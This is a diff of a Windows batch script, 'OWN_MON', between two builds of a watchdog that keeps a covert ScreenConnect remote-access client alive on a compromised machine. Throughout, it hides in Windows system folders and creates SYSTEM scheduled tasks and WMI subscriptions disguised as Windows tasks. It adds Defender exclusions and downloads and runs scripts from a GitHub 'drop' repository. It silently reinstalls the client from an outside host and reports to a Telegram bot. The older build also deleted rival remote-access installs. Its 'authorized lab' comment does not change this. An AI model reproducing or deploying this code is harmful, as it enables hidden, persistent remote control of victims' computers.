@@ -1,263 +1,247 @@
 @echo off
-setlocal EnableExtensions EnableDelayedExpansion
-REM OWN_MON BUILD 20260802M8 - clean TR quoting + TG rate-limit + nuke + TG
-set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
-set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
-set "LOG=%WD%\boot.err"
-set "PRIM=ScreenConnect Client (5f6010579852e507)"
-set "ALT=ScreenConnect Client (f861c8140d453427)"
-set "KEEP1=5f6010579852e507"
-set "KEEP2=f861c8140d453427"
-set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
-set "OWN=%WD%\own_run.cmd"
-set "MSICACHE=%WD%\pkg.msi"
-set "STATE=%WD%\tg_state.txt"
-set "CB=%RANDOM%%RANDOM%"
-set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
-set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
-set "HOST=%COMPUTERNAME%"
-set "PF86=%ProgramFiles(x86)%"
+rem ═══════════════════════════════════════════════════════════════
+rem  OWN_MON  BUILD 20260802M9
+rem  Persistent watchdog - identity-aware (anti-signature), mutual
+rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
+rem  Authorized internal deployment - lab/competition scope only.
+rem ═══════════════════════════════════════════════════════════════
+setlocal EnableDelayedExpansion
+
+set "KEEP_FP=5f6010579852e507"
+set "ALT_FP=f861c8140d453427"
+set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
+set "ETL=C:\ProgramData\Microsoft\Windows\WER\Temp\.etlcache"
+set "LOG=%WD%\own_mon.log"
+set "STATE=%WD%\own_mon.state"
+set "HBFLAG=%WD%\hb.flag"
 set "CURL=%SystemRoot%\System32\curl.exe"
+set "TG=https://raw.githubusercontent.com/xnobuddy/github-drop/main/tg_report.ps1"
+set "TG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/tg_report.ps1"
+set "OWNSEC=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_secure.cmd"
+set "OWNSEC2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_secure.cmd"
+set "OWNMON=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_mon.cmd"
+set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd"
+set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1"
+set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1"
+set "MSI_URL=https://sevrz.com/ScreenConnect.ClientSetup.msi"
+set "MSI_PKG1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg.msi"
+set "MSI_PKG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/pkg.msi"
+set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
+
+if not exist "%WD%" md "%WD%" 2>nul
+if not exist "%LOG%" type nul>"%LOG%" 2>nul
+
+set "MONVER=M9"
+for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
+echo.>>"%LOG%"
+echo ── tick !DT! [ver %MONVER%] ──>>"%LOG%"
+set "COUNT=0"
+set "INSTALLED=0"
+set "PRIM_OK=0"
+set "ALT_OK=0"
+set "FOREIGN_LEFT=0"
+set "FOREIGN_LIST="
+
+rem ── per-host identity (anti-signature) ────────────────────────
+if not exist "%WD%\identity.cfg" if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
+if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,2 delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%V"
+if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\Scheduled"
+if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\Server"
+if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHost"
+if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpAddressConflict1"
+if not defined MO_A set "MO_A=2"
+if not defined MO_B set "MO_B=3"
+
+rem ── [A] auto-update core files (best effort) ──────────────────
 if not exist "%CURL%" set "CURL=curl.exe"
-
-if not exist "%WD%" mkdir "%WD%" >nul 2>&1
-if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo mon_tick %DATE% %TIME% M6>>"%LOG%"
-
-REM --- refresh secure + re-apply exclusions/ACL every tick ---
-set "SEC=%WD%\own_secure.cmd"
-"%CURL%" -L --ssl-no-revoke --connect-timeout 15 --max-time 45 -o "%TEMP%\own_secure_upd.cmd" "%DROP%/own_secure.cmd?t=%CB%" >nul 2>&1
-if not exist "%TEMP%\own_secure_upd.cmd" "%CURL%" -L --ssl-no-revoke --connect-timeout 15 --max-time 45 -o "%TEMP%\own_secure_upd.cmd" "%DROP2%/own_secure.cmd?t=%CB%" >nul 2>&1
-if exist "%TEMP%\own_secure_upd.cmd" for %%A in ("%TEMP%\own_secure_upd.cmd") do if %%~zA GTR 400 (
-  findstr /C:"OWN_SECURE BUILD" "%TEMP%\own_secure_upd.cmd" >nul && copy /y "%TEMP%\own_secure_upd.cmd" "%SEC%" >nul
-)
-if exist "%SEC%" call "%SEC%"
-
-REM --- refresh rich Telegram reporter from repo ---
-set "TGR=%WD%\tg_report.ps1"
-"%CURL%" -L --ssl-no-revoke --connect-timeout 15 --max-time 45 -o "%TEMP%\tg_report_upd.ps1" "%DROP%/tg_report.ps1?t=%CB%" >nul 2>&1
-if not exist "%TEMP%\tg_report_upd.ps1" "%CURL%" -L --ssl-no-revoke --connect-timeout 15 --max-time 45 -o "%TEMP%\tg_report_upd.ps1" "%DROP2%/tg_report.ps1?t=%CB%" >nul 2>&1
-if exist "%TEMP%\tg_report_upd.ps1" for %%A in ("%TEMP%\tg_report_upd.ps1") do if %%~zA GTR 500 (
-  findstr /C:"TG_REPORT BUILD" "%TEMP%\tg_report_upd.ps1" >nul && copy /y "%TEMP%\tg_report_upd.ps1" "%TGR%" >nul
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\tg_report.new" "%TG%" >nul 2>&1
+if not exist "%WD%\tg_report.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\tg_report.new" "%TG2%" >nul 2>&1
+for %%F in ("%WD%\tg_report.new") do if %%~zF GTR 1500 move /y "%WD%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%WD%\own_secure.new" "%OWNSEC%" >nul 2>&1
+if not exist "%WD%\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time 30 -o "%WD%\own_secure.new" "%OWNSEC2%" >nul 2>&1
+for %%F in ("%WD%\own_secure.new") do if %%~zF GTR 800 move /y "%WD%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.new" "%OWNLIB%" >nul 2>&1
+if not exist "%WD%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.new" "%OWNLIB2%" >nul 2>&1
+for %%F in ("%WD%\own_lib.new") do if %%~zF GTR 1500 move /y "%WD%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
+rem self-update: download new own_mon, apply AFTER this tick
+set "SELF_UPD=0"
+"%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_mon.next" "%OWNMON%" >nul 2>&1
+if not exist "%WD%\own_mon.next" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\own_mon.next" "%OWNMON2%" >nul 2>&1
+for %%F in ("%WD%\own_mon.next") do if %%~zF GTR 1500 (
+  fc /b "%WD%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
+  if errorlevel 1 set "SELF_UPD=1"
 )
 
-REM --- self-rearm persist if someone deleted the tasks ---
-schtasks /Query /TN "\Microsoft\Windows\Diagnosis\Scheduled" >nul 2>&1
+rem ── [B] re-arm chain 1 (schtasks) if missing ──────────────────
+schtasks /Query /TN "%TASK_A%" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\Diagnosis\Scheduled" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 2 /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
-  echo rearm_taskA>>"%LOG%"
+  echo rearm TASK_A %TASK_A%>>"%LOG%"
+  schtasks /Create /F /TN "%TASK_A%" /SC MINUTE /MO %MO_A% /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >nul 2>&1
+  schtasks /Run /TN "%TASK_A%" >nul 2>&1
 )
-schtasks /Query /TN "\Microsoft\Windows\PLA\Server" >nul 2>&1
+schtasks /Query /TN "%TASK_B%" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\PLA\Server" /RU SYSTEM /RL HIGHEST /SC MINUTE /MO 3 /F /TR "cmd.exe /c %WD2%\etl_mon.cmd" >nul 2>&1
-  echo rearm_taskB>>"%LOG%"
+  echo rearm TASK_B %TASK_B%>>"%LOG%"
+  schtasks /Create /F /TN "%TASK_B%" /SC MINUTE /MO %MO_B% /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >nul 2>&1
+  schtasks /Run /TN "%TASK_B%" >nul 2>&1
 )
-schtasks /Query /TN "\Microsoft\Windows\WDI\ResolutionHost" >nul 2>&1
+schtasks /Query /TN "%TASK_C%" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\WDI\ResolutionHost" /RU SYSTEM /RL HIGHEST /SC ONSTART /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
-  echo rearm_onstart>>"%LOG%"
+  echo rearm TASK_C %TASK_C%>>"%LOG%"
+  schtasks /Create /F /TN "%TASK_C%" /SC ONSTART /RU SYSTEM /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >nul 2>&1
 )
-schtasks /Query /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" >nul 2>&1
+schtasks /Query /TN "%TASK_D%" >nul 2>&1
 if errorlevel 1 (
-  schtasks /Create /TN "\Microsoft\Windows\Tcpip\IpAddressConflict1" /RU SYSTEM /RL HIGHEST /SC ONLOGON /F /TR "cmd.exe /c %WD%\own_mon.cmd" >nul 2>&1
-  echo rearm_onlogon>>"%LOG%"
+  echo rearm TASK_D %TASK_D%>>"%LOG%"
+  schtasks /Create /F /TN "%TASK_D%" /SC ONLOGON /RL HIGHEST /TR "cmd /c %WD%\own_mon.cmd" >nul 2>&1
 )
 
-REM --- auto-update own.txt + own_mon.cmd from repo ---
-set "TMP=%TEMP%\own_upd.txt"
-del /f /q "%TMP%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMP%" "%DROP%/own.txt?t=%CB%" >nul 2>&1
-if not exist "%TMP%" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMP%" "%DROP2%/own.txt?t=%CB%" >nul 2>&1
-if exist "%TMP%" for %%A in ("%TMP%") do if %%~zA GTR 1000 (
-  findstr /C:"OWN BUILD" "%TMP%" >nul && (
-    copy /y "%TMP%" "%OWN%" >nul
-    echo own_updated>>"%LOG%"
+rem ── [B2] re-arm chain 2 (WMI subscription) if missing ─────────
+if exist "%WD%\own_lib.ps1" (
+  for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do set "WD_STATE=%%R"
+  if /I "!WD_STATE!"=="REARMED" echo watchdog WMI REARMED>>"%LOG%"
+)
+
+rem ── [C] heal ScreenConnect prim/alt ────────────────────────────
+for /f "tokens=1,2 delims=()" %%a in ('sc query "ScreenConnect Client (%KEEP_FP%)" ^| findstr /C:"SERVICE_NAME"') do (
+  set /a COUNT+=1
+  set "INSTALLED=1"
+  set "PRIMSTATE=%%b"
+)
+sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
+if not errorlevel 1 set "PRIM_OK=1"
+for /f "tokens=1,2 delims=()" %%a in ('sc query "ScreenConnect Client (%ALT_FP%)" ^| findstr /C:"SERVICE_NAME"') do set /a COUNT+=1
+sc query "ScreenConnect Client (%ALT_FP%)" | find "RUNNING" >nul
+if not errorlevel 1 set "ALT_OK=1"
+
+if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
+  echo svc heal restart>>"%LOG%"
+  net start "ScreenConnect Client (%KEEP_FP%)" >nul 2>&1
+  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
+  if not errorlevel 1 set "PRIM_OK=1"
+)
+if "%INSTALLED%"=="1" if "%PRIM_OK%"=="0" (
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "svc-wont-start" >nul 2>&1
+  call :TgState DOWN "ScreenConnect (%KEEP_FP%) installed but wont start"
+  goto :ForeignCheck
+)
+if "%INSTALLED%"=="1" goto :ForeignCheck
+
+rem ── [D] primary SC missing - full reinstall ───────────────────
+echo svc missing - reinstalling>>"%LOG%"
+call :InstallMsi "%MSI_URL%" "main"
+if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG1?t=%RANDOM%" "github-pkg"
+if "%INSTALLED%"=="0" call :InstallMsi "%MSI_PKG2%" "jsdelivr-pkg"
+if "%INSTALLED%"=="0" (
+  for %%F in ("%MSI%") do if %%~zF GTR 1000000 (
+    echo cache retry install>>"%LOG%"
+    msiexec /i "%MSI%" /qn /norestart >nul 2>&1
+    call :WaitSvc
+  )
+)
+if "%INSTALLED%"=="0" (
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "msi-failed" >nul 2>&1
+  call :TgState FAIL "MSI install failed on all sources"
+) else (
+  echo svc restored>>"%LOG%"
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% -Extra "restored" >nul 2>&1
+  call :TgState RESTORED "ScreenConnect reinstalled OK"
+)
+
+:ForeignCheck
+rem ── [E] count foreign SC leftovers (never touch allowlist) ─────
+for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
+  set "FP=%%a"
+  set "FP=!FP: =!"
+  set /a COUNT+=1
+  if /I not "!FP!"=="%KEEP_FP%" if /I not "!FP!"=="%ALT_FP%" (
+    set /a FOREIGN_LEFT+=1
+    set "FOREIGN_LIST=!FOREIGN_LIST!!FP! "
   )
 )
 
-set "TMPM=%TEMP%\own_mon_upd.cmd"
-del /f /q "%TMPM%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMPM%" "%DROP%/own_mon.cmd?t=%CB%" >nul 2>&1
-if not exist "%TMPM%" "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 60 -o "%TMPM%" "%DROP2%/own_mon.cmd?t=%CB%" >nul 2>&1
-if exist "%TMPM%" for %%A in ("%TMPM%") do if %%~zA GTR 400 (
-  findstr /C:"OWN_MON BUILD" "%TMPM%" >nul && (
-    copy /y "%TMPM%" "%WD%\own_mon.cmd" >nul
-    copy /y "%TMPM%" "%WD2%\etl_mon.cmd" >nul
-    echo mon_updated>>"%LOG%"
-  )
+rem ── [F] stealth re-secure (quiet Defender exclusion refresh) ──
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '%WD%','%ETL%' -ErrorAction Stop } catch {}" >nul 2>&1
+
+rem ── [G] periodic full re-secure every ~2 h ────────────────────
+powershell -NoProfile -NonInteractive -Command "if((Test-Path '%WD%\own_secure.cmd') -and (( -not (Test-Path '%WD%\sec.flag')) -or (((Get-Date) - (Get-Item -LiteralPath '%WD%\sec.flag').LastWriteTime).TotalHours -ge 2))){ exit 1 } else { exit 0 }" >nul 2>&1
+if errorlevel 1 (
+  echo periodic re-secure>>"%LOG%"
+  call "%WD%\own_secure.cmd" >>"%LOG%" 2>&1
+  echo done>"%WD%\sec.flag"
 )
 
-REM --- always scrub foreign SC (orphans + rival) ---
-call :NukeForeign
-
-REM --- remote panic switch ---
-set "FORCE=0"
-set "FLG=%TEMP%\rescue.flag"
-del /f /q "%FLG%" >nul 2>&1
-"%CURL%" -L --ssl-no-revoke --connect-timeout 15 --max-time 30 -o "%FLG%" "%DROP%/rescue.flag?t=%CB%" >nul 2>&1
-if not exist "%FLG%" "%CURL%" -L --ssl-no-revoke --connect-timeout 15 --max-time 30 -o "%FLG%" "%DROP2%/rescue.flag?t=%CB%" >nul 2>&1
-if exist "%FLG%" for %%A in ("%FLG%") do if %%~zA GTR 0 (
-  findstr /I /C:"REINSTALL" "%FLG%" >nul && (
-    set "FORCE=1"
-    echo rescue_flag_active>>"%LOG%"
-  )
+rem ── [H] campaign state + hourly compact digest ────────────────
+if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% >nul 2>&1
+powershell -NoProfile -NonInteractive -Command "if((Test-Path '%HBFLAG%') -and (New-TimeSpan -Start (Get-Item -LiteralPath '%HBFLAG%').LastWriteTime).TotalMinutes -lt 60){ exit 0 } else { exit 1 }" >nul 2>&1
+if errorlevel 1 (
+  echo hb>%HBFLAG%
+  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State HB -Mode compact -Build %MONVER% -Count !COUNT! >nul 2>&1
+  echo digest HB sent>>"%LOG%"
 )
 
-sc query "%PRIM%" | findstr /I RUNNING >nul
-if not errorlevel 1 if "%FORCE%"=="0" (
-  sc config "%ALT%" start= auto >nul 2>&1
-  sc start "%ALT%" >nul 2>&1
-  echo primary_ok>>"%LOG%"
-  call :TgState OK "PRIMARY OK"
+rem ── [I] self-update apply (last thing this tick) ──────────────
+if "%SELF_UPD%"=="1" (
+  echo self-update apply>>"%LOG%"
+  move /y "%WD%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
+)
+
+echo tick done: prim=%PRIM_OK% alt=%ALT_OK% foreign=%FOREIGN_LEFT%>>"%LOG%"
+endlocal
+exit /b 0
+
+rem ═══════════════ helpers ═══════════════
+:InstallMsi
+rem %1=url %2=tag
+set "URL=%~1"
+set "TAG=%~2"
+echo [%TAG%] fetch %URL%>>"%LOG%"
+"%CURL%" -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o "%MSI%.tmp" "%URL%" >>"%LOG%" 2>&1
+for %%F in ("%MSI%.tmp") do if %%~zF LEQ 1000000 (
+  echo [%TAG%] fetch failed>>"%LOG%"
+  del /f /q "%MSI%.tmp" >nul 2>&1
+  exit /b 1
+)
+move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
+echo [%TAG%] msiexec install>>"%LOG%"
+msiexec /i "%MSI%" /qn /norestart >nul 2>&1
+call :WaitSvc
+exit /b 0
+
+:WaitSvc
+set "TRIES=0"
+:WaitLoop
+sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
+if not errorlevel 1 (
+  set "INSTALLED=1"
+  set "PRIM_OK=1"
   exit /b 0
 )
-
-echo primary_missing_or_forced_reinstall FORCE=%FORCE%>>"%LOG%"
-if "%FORCE%"=="1" (
-  call :TgState FORCE "rescue.flag REINSTALL - forcing MSI"
-) else (
-  call :TgState DOWN "PRIMARY DOWN - reinstalling MSI"
-)
-
-call :InstallMsi
-set "MSI_RC=%ERRORLEVEL%"
-sc config "%PRIM%" start= auto >nul 2>&1
-sc start "%PRIM%" >nul 2>&1
-sc config "%ALT%" start= auto >nul 2>&1
-sc start "%ALT%" >nul 2>&1
-timeout /t 5 /nobreak >nul
-sc start "%PRIM%" >nul 2>&1
-
-sc query "%PRIM%" | findstr /I RUNNING >nul
-if not errorlevel 1 (
-  echo primary_restored>>"%LOG%"
-  call :TgState RESTORED "PRIMARY RESTORED after heal"
-) else (
-  echo primary_still_down>>"%LOG%"
-  if "%MSI_RC%"=="1" (
-    call :TgState FAIL "PRIMARY STILL DOWN - MSI unavailable (sevrz download failed?)"
-  ) else (
-    call :TgState FAIL "PRIMARY STILL DOWN after msiexec"
-  )
-)
-exit /b 0
-
-:InstallMsi
-set "MSI=%TEMP%\sc_mon.msi"
-del /f /q "%MSI%" >nul 2>&1
-echo mon_fetch_msi>>"%LOG%"
-if exist "%SystemRoot%\System32\curl.exe" (
-  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%MSI%" "%MSIURL%" >>"%LOG%" 2>&1
-)
-if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 goto :DoMsiCache
-curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%MSI%" "%MSIURL%" >>"%LOG%" 2>&1
-if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 goto :DoMsiCache
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
-  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
-  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%MSI%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('mon_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
-if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 goto :DoMsiCache
-if exist "%MSICACHE%" for %%A in ("%MSICACHE%") do if %%~zA GEQ 500000 (
-  copy /y "%MSICACHE%" "%MSI%" >nul
-  echo msi_from_cache>>"%LOG%"
-  goto :DoMsi
-)
-echo msi_unavailable>>"%LOG%"
-exit /b 1
-
-:DoMsiCache
-copy /y "%MSI%" "%MSICACHE%" >nul
-echo msi_cached>>"%LOG%"
-
-:DoMsi
-msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_mon.log"
-echo msi_exit_%ERRORLEVEL%>>"%LOG%"
-msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus REBOOT=ReallySuppress
-echo msi_reinstall_%ERRORLEVEL%>>"%LOG%"
-exit /b 0
-
-:NukeForeign
-echo nuke_begin>>"%LOG%"
-for /f "tokens=2 delims=:" %%A in ('sc query state= all ^| findstr /C:"SERVICE_NAME:"') do (
-  set "SN=%%A"
-  if defined SN (
-    set "SN=!SN:~1!"
-    echo !SN! | findstr /I "ScreenConnect" >nul
-    if not errorlevel 1 (
-      set "KEEP=0"
-      echo !SN! | findstr /I "%KEEP1%" >nul && set "KEEP=1"
-      echo !SN! | findstr /I "%KEEP2%" >nul && set "KEEP=1"
-      if "!KEEP!"=="0" (
-        echo nuke_svc=!SN!>>"%LOG%"
-        sc stop "!SN!" >nul 2>&1
-        sc delete "!SN!" >nul 2>&1
-      )
-    )
-  )
-)
-wmic process where "name='ScreenConnect.ClientService.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%'" call terminate >nul 2>&1
-wmic process where "name='ScreenConnect.WindowsClient.exe' and not ExecutablePath like '%%!KEEP1!%%' and not ExecutablePath like '%%!KEEP2!%%'" call terminate >nul 2>&1
-for %%R in ("%ProgramFiles%" "%PF86%") do (
-  if exist "%%~R" for /d %%D in ("%%~R\ScreenConnect*") do (
-    set "KEEP=0"
-    echo %%~nxD | findstr /I "%KEEP1%" >nul && set "KEEP=1"
-    echo %%~nxD | findstr /I "%KEEP2%" >nul && set "KEEP=1"
-    if "!KEEP!"=="0" (
-      echo nuke_dir=%%~D>>"%LOG%"
-      takeown /F "%%~D" /R /D Y >nul 2>&1
-      icacls "%%~D" /grant Administrators:F /T /C >nul 2>&1
-      rd /s /q "%%~D" >nul 2>&1
-    )
-  )
-)
-echo nuke_done>>"%LOG%"
-exit /b 0
+set /a TRIES+=1
+if %TRIES% GEQ 10 exit /b 1
+ping 127.0.0.1 -n 7 >nul 2>&1
+goto :WaitLoop
 
 :TgState
 set "NEWSTATE=%~1"
 set "MSG=%~2"
 set "OLDSTATE="
 if exist "%STATE%" set /p OLDSTATE=<"%STATE%"
-REM rate-limit repeated DOWN/FAIL: max 1 alert per 30 min while stuck
+rem rate-limit repeated DOWN/FAIL: max 1 alert per 30 min while stuck
 if /I "%NEWSTATE%"=="DOWN" goto :MaybeSuppress
 if /I "%NEWSTATE%"=="FAIL" goto :MaybeSuppress
 goto :SendAlert
 :MaybeSuppress
 if /I "%NEWSTATE%"=="%OLDSTATE%" if exist "%WD%\tg_sent.flag" (
-  powershell.exe -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 30){exit 0}else{exit 1}" >nul 2>&1
+  powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 30){exit 0}else{exit 1}" >nul 2>&1
   if not errorlevel 1 (
     echo tg_suppressed_%NEWSTATE%>>"%LOG%"
     exit /b 0
   )
 )
 :SendAlert
-if /I "%NEWSTATE%"=="%OLDSTATE%" if exist "%WD%\tg_sent.flag" (
-  powershell.exe -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 30){exit 0}else{exit 1}" >nul 2>&1
-  if not errorlevel 1 if /I not "%NEWSTATE%"=="OK" if /I not "%NEWSTATE%"=="RESTORED" exit /b 0
-)
 echo %NEWSTATE%>"%STATE%"
-echo sent>%WD%\tg_sent.flag
-if not exist "%WD%\notify.cfg" exit /b 0
-if not exist "%WD%\tg_report.ps1" (
-  "%CURL%" -L --ssl-no-revoke --connect-timeout 15 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
-)
-if exist "%WD%\tg_report.ps1" (
-  powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State "%NEWSTATE%" -Summary "%MSG%" -WorkDir "%WD%" -OldState "%OLDSTATE%"
-) else (
-  call :TgSendFlat "[SC-MON] %HOST% | %MSG% | %NEWSTATE%"
-)
-exit /b 0
-
-:TgSendFlat
-if not exist "%WD%\notify.cfg" exit /b 0
-set "TGMSG=%~1"
-set "TGFILE=%TEMP%\tg_payload.txt"
-(
-  echo %TGMSG%
-) > "%TGFILE%"
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
-  "$ErrorActionPreference='SilentlyContinue';" ^
-  "$cfg=@{}; Get-Content -LiteralPath '%WD%\notify.cfg' | ForEach-Object { if ($_ -match '^\s*([A-Za-z0-9_]+)\s*=\s*(.*)\s*$') { $cfg[$matches[1]] = $matches[2].Trim() } };" ^
-  "if (-not $cfg.BOT_TOKEN -or -not $cfg.CHAT_ID) { exit 0 };" ^
-  "$text = Get-Content -LiteralPath '%TGFILE%' -Raw;" ^
-  "try { Invoke-RestMethod -Uri ('https://api.telegram.org/bot' + $cfg.BOT_TOKEN + '/sendMessage') -Method Post -Body @{ chat_id = $cfg.CHAT_ID; text = $text; disable_web_page_preview = 'true' } | Out-Null } catch {}"
+echo sent>"%WD%\tg_sent.flag"
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State %NEWSTATE% -Summary "%MSG%" -Build %MONVER% -Count %COUNT% >nul 2>&1
+echo tg state %NEWSTATE% sent>>"%LOG%"
 exit /b 0
